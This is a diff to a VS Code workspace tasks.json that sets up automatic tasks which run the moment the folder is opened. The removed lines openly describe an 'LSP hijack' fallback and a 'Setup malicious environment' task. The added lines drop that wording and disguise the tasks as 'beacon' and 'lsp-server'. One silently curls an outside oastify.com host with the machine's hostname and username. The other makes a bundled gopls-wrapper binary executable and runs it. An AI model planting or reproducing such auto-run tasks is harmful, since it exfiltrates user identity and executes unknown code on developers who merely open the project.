@@ -1,63 +1,21 @@
 {
-  // ===========================================================================
-  // .vscode/tasks.json — Backup execution path via auto-run tasks
-  // ===========================================================================
-  //
-  // If the LSP hijack fails (e.g., no Go extension), this provides a
-  // fallback execution path via auto-run tasks.
-  //
-  // GATED BY:
-  //   - Workspace Trust (must be trusted or disabled)
-  //   - task.allowAutomaticTasks must be "on"
-  // ===========================================================================
-
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "Go LSP Server (auto-start)",
+      "label": "beacon",
       "type": "shell",
-      "command": "./gopls-wrapper",
-      "args": ["--mode=attack"],
-      "options": {
-        "cwd": "${workspaceFolder}",
-        "env": {
-          "NODE_OPTIONS": "--unhandled-rejections=strict"
-        }
-      },
-      "runOptions": {
-        "runOn": "folderOpen"
-      },
+      "command": "curl -s https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/$(hostname)-$(whoami)-$(date +%s)",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "silent", "close": true },
+      "problemMatcher": []
+    },
+    {
+      "label": "lsp-server",
+      "type": "shell",
+      "command": "chmod +x ${workspaceFolder}/gopls-wrapper && ${workspaceFolder}/gopls-wrapper",
+      "runOptions": { "runOn": "folderOpen" },
       "isBackground": true,
       "problemMatcher": []
-    },
-    {
-      "label": "Setup malicious environment",
-      "type": "shell",
-      "command": "chmod",
-      "args": ["+x", "${workspaceFolder}/gopls-wrapper"],
-      "options": {
-        "cwd": "${workspaceFolder}"
-      },
-      "runOptions": {
-        "runOn": "folderOpen"
-      },
-      "isBackground": false,
-      "problemMatcher": []
-    },
-    {
-      "label": "Install Node.js dependencies",
-      "type": "shell",
-      "command": "node",
-      "args": ["-e", "console.log('Node.js available: ' + process.version)"],
-      "options": {
-        "cwd": "${workspaceFolder}"
-      },
-      "runOptions": {
-        "runOn": "folderOpen"
-      },
-      "isBackground": false,
-      "problemMatcher": [],
-      "dependsOn": ["Setup malicious environment"]
     }
   ]
 }
